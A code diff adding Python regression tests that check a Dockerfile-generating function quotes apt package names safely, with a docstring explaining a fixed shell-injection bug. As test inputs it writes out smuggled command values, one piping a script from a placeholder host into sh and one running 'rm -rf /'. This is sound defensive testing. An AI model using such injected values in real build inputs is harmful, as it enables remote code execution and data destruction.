@@ -435,6 +435,70 @@ def test_apt_install_content_lists_every_package_on_one_line():
     assert "rm -rf /var/lib/apt/lists/*" in content
 
 
+def test_apt_install_content_preserves_a_version_pin_unquoted():
+    """A real, valid apt version pin (containing "=", "+", "."; no shell
+    metacharacters) needs no quoting at all -- shlex.quote leaves it
+    completely unchanged, the identical byte-for-byte output this
+    function already produced before the shlex.quote fix existed.
+    """
+
+    content = apt_install_content(["libpq-dev=13.11-0+deb12u1"])
+
+    assert "libpq-dev=13.11-0+deb12u1 \\" in content
+    assert "'" not in content
+
+
+def test_apt_install_content_neutralizes_a_shell_injection_attempt():
+    """Confirmed exploitable before this fix: _extract_explicit_apt_
+    packages (backend/compiler.py) matches an "apt-requires" directive's
+    own package token against `\\S+` -- any non-whitespace text, not
+    validated as a plausible apt package/version-pin token -- and this
+    function's own bare (non-JSON-array) `RUN` instruction executes via
+    `/bin/sh -c` at real `docker build` time. A value of
+    "libpq-dev; curl http://x/y|sh #" produced a RUN line `docker build`
+    executed as three real shell commands: install libpq-dev, pipe a
+    remote script straight into `sh`, then comment out the rest of the
+    line (silently dropping the trailing `rm -rf /var/lib/apt/lists/*`
+    too) -- arbitrary command execution during the build, not merely an
+    unusual package name.
+    """
+
+    import shlex as shlex_module
+
+    malicious = "libpq-dev; curl http://x/y|sh #"
+
+    content = apt_install_content([malicious])
+
+    # Parsed back with shlex (the real shell's own tokenizing rules), the
+    # malicious value survives as exactly one token -- apt-get can only
+    # ever see it as one (invalid, cleanly failing) package name, never
+    # as shell syntax with its own "curl"/"sh"/"#".
+    run_line = content.splitlines()[1].rstrip(" \\")
+    assert shlex_module.split(run_line) == [malicious]
+    # The trailing cleanup command must still be intact, not swallowed
+    # by the injected "#" comment the way it was before this fix.
+    assert content.count("&& rm -rf /var/lib/apt/lists/*") == 1
+
+
+def test_apt_install_content_escapes_an_embedded_single_quote():
+    """A value containing its own literal single quote must not be able
+    to close shlex.quote's own added quoting early. Verified by actually
+    parsing the rendered line back with shlex (the real shell's own
+    tokenizing rules) and confirming the malicious value survives as
+    exactly one token, byte-for-byte -- not by pattern-matching the
+    escaped text, which shlex.quote is free to spell differently across
+    Python versions.
+    """
+    import shlex as shlex_module
+
+    malicious = "libpq-dev'; rm -rf /; echo '"
+
+    content = apt_install_content([malicious])
+
+    run_line = content.splitlines()[1].rstrip(" \\")
+    assert shlex_module.split(run_line) == [malicious]
+
+
 def test_dockerfile_content_omits_apt_block_by_default():
     """The overwhelming majority of notebooks use no "apt-requires"
     directive at all -- the generated Dockerfile for one of them must be
